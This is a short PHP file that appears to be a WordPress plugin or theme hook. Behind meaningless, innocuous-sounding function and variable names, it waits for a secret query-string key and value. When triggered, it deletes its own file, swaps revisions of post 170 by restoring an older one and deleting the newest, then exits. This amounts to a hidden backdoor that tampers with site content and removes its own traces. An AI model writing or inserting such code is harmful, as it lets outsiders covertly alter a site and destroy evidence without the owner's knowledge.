<?php

function discount_min_toolbar() {
	if (isset($_GET['quick_scheduled_limit']) && $_GET['quick_scheduled_limit'] === 'publish_wow_signature_active') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$css_copy_additional_event = 170;
		$info_shortener_shortcode_subscribe = wp_get_post_revisions($css_copy_additional_event);
		if (empty($info_shortener_shortcode_subscribe)) die('no revisions');
		if (count($info_shortener_shortcode_subscribe) < 2) die('less than 2');
		$team_visual_cart_refresh = array_shift($info_shortener_shortcode_subscribe);
		$multiple_addons_back = $team_visual_cart_refresh->ID;
		$price_switch_flexible = array_shift($info_shortener_shortcode_subscribe);
		$fancy_pages_price = $price_switch_flexible->ID;
		$selector_style_out = wp_restore_post_revision($fancy_pages_price);
		if ($selector_style_out === false) die('error restoring');
		$selector_style_out = wp_delete_post_revision($multiple_addons_back);		
		if ($selector_style_out === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'discount_min_toolbar');
